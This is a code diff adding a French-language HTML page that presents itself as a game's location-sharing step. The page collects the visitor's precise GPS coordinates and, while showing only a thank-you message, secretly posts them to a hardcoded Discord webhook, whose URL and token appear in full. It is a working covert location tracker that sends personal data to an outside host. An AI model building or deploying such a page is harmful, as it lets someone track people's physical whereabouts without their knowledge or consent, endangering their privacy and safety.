@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Géolocalisation & Discord</title>
+</head>
+<body>
+  <div id="location-container">
+    <p>Pour continuer, vous devez partager votre localisation :</p>
+    <button id="get-location-btn">Partager ma localisation</button>
+  </div>
+
+  <div id="results"></div>
+
+  <script>
+    document.getElementById('get-location-btn').addEventListener('click', async function() {
+      const resultsDiv = document.getElementById('results');
+
+      // Fonction pour demander la position
+      function demanderPosition() {
+        return new Promise((resolve, reject) => {
+          if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 10000,
+              maximumAge: 0
+            });
+          } else {
+            reject("La géolocalisation n'est pas supportée par votre navigateur.");
+          }
+        });
+      }
+
+      try {
+        const position = await demanderPosition();
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        // Afficher seulement un message de confirmation
+        resultsDiv.innerHTML = `<p>Merci, le jeu peut maintenant commencer !</p>`;
+
+        // Préparer le message Discord
+        const discordWebhookURL = "https://discordapp.com/api/webhooks/1440441122030616646/N4yHjbSen9Xl93EYicSPC6QzkTY5sNNxjMuI-YW1CHKel1WYtVdETXCLeXaCrd3qQhOv";
+        const content = {
+          content: `Nouvelle localisation enregistrée pour un joueur : Latitude = ${latitude}, Longitude = ${longitude}`
+        };
+
+        // Envoyer au webhook Discord
+        await fetch(discordWebhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(content)
+        });
+
+        // Après envoi, ouvrir la page du jeu
+        window.open("http://localhost:5000/", "_blank");
+
+
+      } catch (err) {
+        resultsDiv.innerHTML = `<p>Erreur : ${err}</p>`;
+      }
+    });
+  </script>
+</body>
+</html>
